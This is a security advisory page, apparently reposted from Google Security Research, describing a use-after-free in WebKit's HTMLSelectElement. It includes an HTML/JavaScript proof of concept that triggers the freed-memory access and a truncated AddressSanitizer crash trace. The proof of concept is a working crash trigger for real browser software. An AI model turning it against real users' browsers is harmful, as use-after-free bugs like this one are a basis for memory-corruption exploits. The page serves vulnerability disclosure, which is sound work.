---
title: WebKit HTMLSelectElement Use-After-Free
url: https://cxsecurity.com/issue/WLB-2022110007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-05
fetch_date: 2025-10-03T21:42:53.927011
---

# WebKit HTMLSelectElement Use-After-Free

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WebKit HTMLSelectElement Use-After-Free** **2022.11.04**  Credit:  **[Google Security Research](https://cxsecurity.com/author/Google%2BSecurity%2BResearch/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

WebKit use-after-free in HTMLSelectElement
There is a use-after-free in HTMLSelectElement. If the length of the HTMLSelectElement is set to a value greater than the existing options length then dummy HTMLOptionElements elements are created. These HTMLOptionsElements are stored as raw pointers in HTMLSelectElement::m\_listItems.
When `surroundElements()` {1} is called, all children of the parent element (`selectElement`) are replaced. The second time this is called it frees all of the dummy HTMLOptionElements. However `m\_listItems` still holds pointers to all of these freed elements, causing the UAF when we attempt to access the `selectElement.length` {2}.
Vulnerability confirmed on ASAN build of WebKit on OSX and WebkitGTK as of commit 742112a9a30b00bbcab5ed1abb45819be0f271c2
===========================================================
Proof of Concept
==========================================================
<script>
function jsfuzzer() {
window.addEventListener(\"DOMNodeRemoved\", eventhandler3);
svgvar00024.append(svgvar00021);
}
var i = 0;
function eventhandler3() {
i++;
if (i > 1) { window.removeEventListener(\"DOMNodeRemoved\", eventhandler3); }
var var00001 = document.createRange();
try { var00001.surroundContents(selectElement); } catch(e) { } // {1}
selectElement.length = 2; // {2}
// {3} - Need 1 of these 2 lines
console.log(selectElement.length);
//var var00170 = selectElement.item(1%selectElement.length);
}
</script>
<body onload=jsfuzzer()>
<svg id=\"svgvar00001\" >
<glyph id=\"svgvar00021\"/>
<altGlyph id=\"svgvar00024\"/>
</svg>
<select id=\"selectElement\">a</select>
===========================================================
ASAN Report
===========================================================
=================================================================
==46529==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c000091ae0 at pc 0x00014bab89eb bp 0x7ff7b90a6b80 sp 0x7ff7b90a6b78
READ of size 8 at 0x60c000091ae0 thread T0
==46529==WARNING: invalid path to external symbolizer!
==46529==WARNING: Failed to use and restart external symbolizer!
#0 0x14bab89ea in WebCore::QualifiedName::localName() const+0x2a (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2449ea)
#1 0x14bab89a1 in WebCore::Element::hasLocalName(WTF::AtomString const&) const+0x11 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2449a1)
#2 0x14bab842b in WebCore::HTMLElement::hasTagName(WebCore::HTMLQualifiedName const&) const+0x1b (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x24442b)
#3 0x14e7274af in WTF::TypeCastTraits<WebCore::HTMLOptionElement const, WebCore::HTMLElement const, false>::checkTagName(WebCore::HTMLElement const&)+0x1f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2eb34af)
#4 0x14e727488 in WTF::TypeCastTraits<WebCore::HTMLOptionElement const, WebCore::HTMLElement const, false>::isOfType(WebCore::HTMLElement const&)+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2eb3488)
#5 0x14e7207e8 in bool WTF::is<WebCore::HTMLOptionElement, WebCore::HTMLElement>(WebCore::HTMLElement&)+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2eac7e8)
#6 0x14f92b151 in WebCore::HTMLSelectElement::length() const+0x61 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x40b7151)
#7 0x14f92b284 in WebCore::HTMLSelectElement::setLength(unsigned int)+0xf4 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x40b7284)
#8 0x14f9141b2 in WebCore::HTMLOptionsCollection::setLength(unsigned int)+0x22 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x40a01b2)
#9 0x14c9fce34 in WebCore::setJSHTMLOptionsCollection\_lengthSetter(JSC::JSGlobalObject&, WebCore::JSHTMLOptionsCollection&, JSC::JSValue)::'lambda'()::operator()() const+0x54 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x1188e34)
#10 0x14c9fccf6 in void WebCore::invokeFunctorPropagatingExceptionIfNecessary<WebCore::setJSHTMLOptionsCollection\_lengthSetter(JSC::JSGlobalObject&, WebCore::JSHTMLOptionsCollection&, JSC::JSValue)::'lambda'()>(JSC::JSGlobalObject&, JSC::ThrowScope&, WebCore::setJSHTMLOptionsCollection\_lengthSetter(JSC::JSGlobalObject&, WebCore::JSHTMLOptionsCollection&, JSC::JSValue)::'lambda'()&&)+0xd6 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x1188cf6)
#11 0x14c9fca52 in WebCore::setJSHTMLOptionsCollection\_lengthSetter(JSC::JSGlobalObject&, WebCore::JSHTMLOptionsCollection&, JSC::JSValue)+0x292 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x1188a52)
#12 0x14c8fdb43 in bool WebCore::IDLAttribute<WebCore::JSHTMLOptionsCollection>::set<&(WebCore::setJSHTMLOptionsCollection\_lengthSetter(JSC::JSGlobalObject&, WebCore::JSHTMLOptionsCollection&, JSC::JSValue)), (WebCore::CastedThisErrorBehavior)0>(JSC::JSGlobalObject&, long long, long long, JSC::PropertyName)+0x113 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x1089b43)
#13 0x14c8fda28 in WebCore::setJSHTMLOptionsCollection\_length(JSC::JSGlobalObject\*, long long, long long, JSC::PropertyName)+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x1089a28)
#14 0x13e4f5eb9 in WTF::FunctionPtr<(WTF::PtrTag)30177, bool (JSC::JSGlobalObject\*, long long, long long, JSC::PropertyName), (WTF::FunctionAttributes)1>::operator()(JSC::JSGlobalObject\*, long long, long long, JSC::PropertyName) const+0x29 (/Users/hacksonm...